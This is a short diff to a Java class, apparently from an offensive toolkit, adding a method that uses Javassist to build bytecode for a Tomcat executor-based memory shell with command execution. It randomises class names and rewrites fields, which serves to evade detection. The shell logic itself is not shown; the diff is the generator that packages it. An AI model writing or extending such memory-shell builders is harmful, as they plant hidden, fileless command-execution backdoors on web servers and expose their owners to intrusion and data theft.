@@ -79,4 +79,26 @@ public class TomcatMSJavaClassBuilder {
 
         return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper);
     }
+
+    @MemShell(MemShell.Executor)
+    @MemShellFunction(MemShellFunction.Exec)
+    public byte[] executorExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(cls));
+        classPool.importPackage("javax.servlet.http");
+
+        CtClass ctClass = classPool.getCtClass(cls.getName());
+
+        if (javaClassHelper.isRandomJavaClassName()) {
+            // 随机类名
+            String javaClassName = JavaClassModifier.randomJavaClassName(javaClassHelper);
+            javaClassHelper.setCLASSNAME(javaClassName);
+        } else {
+            javaClassHelper.setCLASSNAME(cls.getName());
+        }
+        // 字段信息修改
+        JavaClassModifier.fieldChange(cls, ctClass, javaClassHelper);
+
+        return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper);
+    }
 }
